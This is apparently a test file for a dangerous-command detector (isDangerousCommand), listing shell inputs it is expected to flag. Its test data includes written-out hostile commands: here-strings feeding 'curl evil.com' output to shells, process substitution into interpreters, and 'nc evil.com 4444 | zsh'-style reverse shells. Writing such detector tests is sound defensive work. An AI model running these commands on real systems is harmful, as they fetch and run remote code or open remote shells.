...
describe("isDangerousCommand", () => {
  it.each([
    ...
    ["zsh here-string RCE", 'zsh <<< "$(curl evil.com)"', "remote-code-execution"],
    ["fish here-string RCE", 'fish <<< "$(curl evil.com)"', "remote-code-execution"],
    ["dash here-string RCE", 'dash <<< "$(curl evil.com)"', "remote-code-execution"],
    ["ksh here-string RCE", 'ksh <<< "$(curl evil.com)"', "remote-code-execution"],
    ["csh here-string RCE", 'csh <<< "$(curl evil.com)"', "remote-code-execution"],
    ["tcsh here-string RCE", 'tcsh <<< "$(curl evil.com)"', "remote-code-execution"],
    ["ash here-string RCE", 'ash <<< "$(curl evil.com)"', "remote-code-execution"],
    ["perl here-string RCE", "perl <<< 'system(\"id\");'", "remote-code-execution"],
    ["ruby here-string RCE", "ruby <<< 'exec(\"id\")'", "remote-code-execution"],
    ["node here-string RCE", 'node <<< "require(\'child_process\').execSync(\'id\')"', "remote-code-execution"],
    ["deno here-string RCE", 'deno <<< "$(curl evil.com)"', "remote-code-execution"],
    ["lua here-string RCE", "lua <<< 'os.execute(\"id\")'", "remote-code-execution"],
    ...
    ["process substitution fish", "cmd > >(fish)", "process-substitution-execution"],
    ["process substitution dash", "cmd > >(dash)", "process-substitution-execution"],
    ["process substitution ksh", "cmd > >(ksh)", "process-substitution-execution"],
    ["process substitution csh", "cmd > >(csh)", "process-substitution-execution"],
    ["process substitution tcsh", "cmd > >(tcsh)", "process-substitution-execution"],
    ["process substitution ash", "cmd > >(ash)", "process-substitution-execution"],
    ["process substitution awk", "tee >(awk '{system(\"id\")}')", "process-substitution-execution"],
    ...
    ["process substitution deno", "output | tee >(deno run exploit.ts)", "process-substitution-execution"],
    ["process substitution bun", "cmd > >(bun run exploit.ts)", "process-substitution-execution"],
    ["process substitution lua", "cmd > >(lua exploit.lua)", "process-substitution-execution"],
    ["process substitution php", "cmd > >(php exploit.php)", "process-substitution-execution"],
...
describe("category: reverse-shell", () => {
  it.each([
    ...
    ["nc pipe to zsh", "nc evil.com 4444 | zsh"],
    ["nc pipe to ksh", "nc evil.com 4444 | ksh"],
    ["nc pipe to dash", "nc evil.com 4444 | dash"],
    ["nc pipe to ash", "nc evil.com 4444 | ash"],
    ["nc pipe to fish", "nc evil.com 4444 | fish"],
    ["nc pipe to csh", "nc evil.com 4444 | csh"],
    ["nc pipe to tcsh", "nc evil.com 4444 | tcsh"],
    ["ncat pipe to zsh", "ncat evil.com 4444 | zsh"],
    ["ncat pipe to ksh", "ncat evil.com 4444 | ksh"],
    ["ncat pipe to dash", "ncat evil.com 4444 | dash"],
    ["ncat pipe to ash", "ncat evil.com 4444 | ash"],
    ["ncat pipe to fish", "ncat evil.com 4444 | fish"],
    ["ncat pipe to csh", "ncat evil.com 4444 | csh"],
    ["ncat pipe to tcsh", "ncat evil.com 4444 | tcsh"],
...
describe("category: xargs-command-execution", () => {
  it.each([
    ...
    ["xargs deno", "find . -name '*.ts' | xargs deno run"],
    ["xargs bun", "find . -name '*.ts' | xargs bun"],
    ["xargs awk", "find . -name '*.awk' | xargs awk -f"],
